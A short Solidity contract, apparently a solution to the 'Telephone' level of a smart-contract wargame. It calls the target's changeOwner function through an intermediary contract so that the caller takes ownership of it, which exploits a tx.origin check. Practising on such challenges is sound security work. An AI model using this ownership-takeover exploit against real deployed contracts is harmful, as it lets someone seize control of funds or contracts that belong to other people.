// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone private telephone;

    constructor(address contractAddress) public {
        telephone = Telephone(contractAddress);
    }

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }

}

